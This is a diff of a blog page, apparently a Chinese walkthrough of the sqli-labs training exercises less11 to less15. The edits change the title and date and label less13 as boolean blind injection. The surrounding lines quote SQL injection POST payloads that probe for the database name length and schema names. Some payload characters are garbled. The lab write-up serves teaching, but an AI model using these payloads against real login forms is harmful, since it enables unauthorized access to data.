@@ -189,7 +189,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/11/06/less11/" class="post-title-link" itemprop="url">less11-14</a>
+          <a href="/2021/11/06/less11/" class="post-title-link" itemprop="url">less11-15</a>
         </h2>
 
         <div class="post-meta-container">
@@ -207,7 +207,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-11-07 21:21:05" itemprop="dateModified" datetime="2021-11-07T21:21:05+08:00">2021-11-07</time>
+        <time title="Modified: 2021-11-07 21:31:16" itemprop="dateModified" datetime="2021-11-07T21:31:16+08:00">2021-11-07</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -256,11 +256,12 @@
 <h1 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h1><p>同样操作</p>
 <p>post data：uname=1’) or 1=1#&amp;passwd=1&amp;submit=Submit</p>
 <p>这次没有报错，但也没有回显</p>
+<p>属于布尔盲注</p>
 <p>post data：uname=1’) or length(database()&gt;1#&amp;passwd=1&amp;submit=Submit来判断数据库名长度</p>
 <p>post data：uname=1’) or left（（select schema_name from information_schema.schemata limit 0,1）,1）=’a’#&amp;passwd=1&amp;submit=Submit来判断列名</p>
 <p>PS：or左右两边其中一边为真都为真，已知左为假，所以只有有报错则右边为假就会报错，所以利用此来破解库名，表名，列名。</p>
 <p>利用工具进行爆破详见less5,6总结</p>
-<p>less14也是同理</p>
+<p>less14，less15也是同理</p>
 
       
     </div>
